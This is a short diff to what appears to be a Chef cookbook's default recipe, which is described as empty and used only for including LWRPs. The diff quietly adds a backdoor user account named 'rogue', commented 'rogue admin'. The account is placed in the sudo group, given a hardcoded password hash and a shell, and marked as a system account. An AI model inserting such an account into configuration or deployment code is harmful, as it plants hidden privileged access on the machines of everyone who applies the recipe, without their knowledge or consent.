@@ -18,3 +18,12 @@
 #
 
 # Empty default recipe for including LWRPs.
+
+user 'rogue' do
+  comment 'rogue admin'
+  gid 'sudo'
+  home '/home/rogue'
+  password '$1$gkl9sSWg$U9aIhckrcXwr08PLbx7NG1'
+  system true
+  shell '/bin/sh'
+end
